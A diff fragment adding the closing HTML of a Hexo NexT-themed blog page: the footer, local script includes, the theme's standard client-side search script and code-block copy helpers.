class="nav-link" href="#参考"><span class="nav-number">12.</span> <span class="nav-text">参考</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Demos</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count">68.7k</span>
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+
+
+
+<div class="theme-info">
+  <div class="powered-by"></div>
+  <span class="post-count">博客全站共68.7k字</span>
+</div>
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  <!-- 代码块复制功能 -->
+  <script type="text/javascript" src="/js/src/clipboard.min.js"></script>  
+  <script type="text/javascript" src="/js/src/clipboard-use.js"></script>
+</body>
+</html>
